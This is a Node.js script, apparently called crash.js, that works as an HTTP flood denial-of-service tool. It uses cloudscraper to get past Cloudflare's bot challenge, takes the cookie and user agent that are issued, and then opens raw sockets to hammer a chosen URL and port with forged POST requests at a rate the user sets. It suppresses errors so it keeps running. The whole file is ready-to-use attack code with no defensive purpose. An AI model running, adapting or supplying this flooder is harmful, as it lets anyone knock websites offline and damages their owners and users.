const EventEmitter = require('events');
const timerFn = require('timer-node');
const timer = timerFn('test-timer');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
var cloudscraper = require('cloudscraper').defaults({
agentOptions: {
    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA:!ECDHE+SHA:!AES128-SHA'
  }
})

const url = require('url');


if (process.argv.length <= 2) {
	console.log("Usage: node crash.js <url> <time> <port> <requests/s>");
	console.log("Usage: node crash.js <http(s)://example.com> <60> <80> <50000>");
	process.exit(-1);
}
var target = process.argv[2];
var time = process.argv[3];
var port = process.argv[4];
var speed = process.argv[5];
var cookie = "";
var ua = "";
var host = url.parse(target).host;
var cookie = "";


function crash () {
cloudscraper.get(target, function (error, response) {
	if (error) {
	} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		ua = (parsed["request"]["headers"]["User-Agent"]);
	}
	console.log('Received tokens!')
	console.log(cookie + '/' + ua);
});

var int = setInterval(() => {
	if (cookie !== '' && ua !== '') {
		var s = require('net').Socket();
		s.connect(port, host);
		s.setTimeout(10000);
		for (var i = 0; i < speed/1000; i++) {
			s.write('POST ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\nName=Gareth+Wylie&Age=24&Formula=a+%2B+b+%3D%3D+13%25%21\r\n\r\n')		
}
	
		s.on('data', function () {
			setTimeout(function () {
				s.destroy();
				return delete s;
			}, 5000);
		})
	}
});
setTimeout(() => clearInterval(int), time * 1000);

// to not crash on errors
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
}

crash();
